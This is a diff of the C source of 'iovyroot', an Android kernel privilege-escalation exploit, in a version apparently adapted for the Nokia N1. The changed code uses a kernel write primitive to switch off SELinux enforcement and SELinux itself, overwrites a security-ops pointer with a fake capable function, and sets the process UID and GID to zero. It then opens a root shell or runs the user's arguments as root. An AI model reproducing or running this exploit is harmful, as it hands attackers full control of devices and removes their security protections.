@@ -278,103 +278,51 @@ static int write_at_address(void* target, unsigned long targetval)
 	return 0;
 }
 
-#if !(__LP64__)
-int getroot(struct offsets* o)
+
+int disable_selinux(struct offsets* o)
 {
-	int dev;
-	int ret = 1;
-	struct thread_info* ti;
-
-	printf("[+] Installing func ptr\n");
-	if(write_at_address(o->fsync, (unsigned long)&patchaddrlimit))
+    printf("selinux enforcing=0\n");
+	if(write_at_address(o->selinux_enforcing, 0))
 		return 1;
-
-	sidtab = o->sidtab;
-	policydb = o->policydb;
-	if((dev = open("/dev/ptmx", O_RDWR)) < 0)
+    printf("selinux disabled=1\n");
+	if(write_at_address(o->selinux_disabled, 1))
 		return 1;
-	
-	ti = (struct thread_info*)fsync(dev);
-	if(modify_task_cred_uc(ti))
-		goto end;
-
-
-	{
-		int zero = 0;
-		if(o->selinux_enabled)
-			write_at_address_pipe(o->selinux_enabled, &zero, sizeof(zero));
-		if(o->selinux_enforcing)
-			write_at_address_pipe(o->selinux_enforcing, &zero, sizeof(zero));
-	}
-
-	ret = 0;
-end:
-	close(dev);
-	return ret;
+    printf("selinux enabled=0\n");
+	if(write_at_address(o->selinux_enabled, 0))
+		return 1;
+    return 0;
 }
-#else
+
 int getroot(struct offsets* o)
 {
 	int ret = 1;
-	int dev;
-	unsigned long fp;
-	struct thread_info* ti;
-	void* jopdata;
+    if(disable_selinux(o)) {
+        return 1;
+    }
 
-	if((jopdata = mmap((void*)((unsigned long)MMAP_ADDR + MMAP_SIZE), PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0)) == (void*)-1)
-		return -ENOMEM;
+    printf("replace capable\n");
+	if(write_at_address(o->selinux_ops, (unsigned long)o->fake_capable)) {
+		return 1;
+    }
 
-	printf("[+] Installing JOP\n");
-	if(write_at_address(o->check_flags, (unsigned long)o->joploc))
-		goto end2;
-
-	sidtab = o->sidtab;
-	policydb = o->policydb;
-	preparejop(jopdata, o->jopret);
-	if((dev = open("/dev/ptmx", O_RDWR)) < 0)
-		goto end2;
-
-	//we only get the lower 32bit because the return of fcntl is int
-	fp = (unsigned)fcntl(dev, F_SETFL, jopdata);
-	fp += KERNEL_START;
-	ti = get_thread_info(fp);
-
-	printf("[+] Patching addr_limit\n");
-	if(write_at_address(&ti->addr_limit, -1))
-		goto end;
-	printf("[+] Removing JOP\n");
-	if(writel_at_address_pipe(o->check_flags, 0))
-		goto end;
-
-	if((ret = modify_task_cred_uc(ti)))
-		goto end;
-
-	//Z5 has domain auto trans from init to init_shell (restricted) so disable selinux completely
-	{
-		int zero = 0;
-		if(o->selinux_enabled)
-			write_at_address_pipe(o->selinux_enabled, &zero, sizeof(zero));
-		if(o->selinux_enforcing)
-			write_at_address_pipe(o->selinux_enforcing, &zero, sizeof(zero));
-	}
-
-	ret = 0;
-end:
-	close(dev);
-end2:
-	munmap(jopdata, PAGE_SIZE);
+    printf("try to setuid\n");
+    setuid(0); seteuid(0); setgid(0); setegid(0);
+	if(getuid() != 0) {
+        // try again
+        setuid(0); seteuid(0); setgid(0); setegid(0);
+    }
 	return ret;
 }
-#endif
 
 int main(int argc, char* argv[])
 {
-	unsigned int i;
+    unsigned int i;
 	int ret = 1;
 	struct offsets* o;
 
 	printf("iovyroot by zxz0O0\n");
-	printf("poc by idler1984\n\n");
+	printf("poc by idler1984\n");
+    printf("special version for nokia n1 by jemyzhang\n\n");
 
 	if(!(o = get_offsets()))
 		return 1;
@@ -397,11 +345,11 @@ int main(int argc, char* argv[])
 	if(getuid() == 0)
 	{
 		printf("got root lmao\n");
-		if(argc <= 1)
-			system("USER=root /system/bin/sh");
-		else
-		{
+		if(argc <= 1) {
+            system("USER=root /system/bin/sh");
+        } else {
 			char cmd[128] = { 0 };
+            strcat(cmd, "USER=root ");
 			for(i = 1; i < (unsigned int)argc; i++)
 			{
 				if(strlen(cmd) + strlen(argv[i]) > 126)
@@ -409,7 +357,7 @@ int main(int argc, char* argv[])
 				strcat(cmd, argv[i]);
 				strcat(cmd, " ");
 			}
-			system(cmd);
+            system(cmd);
 		}
 	}
 	
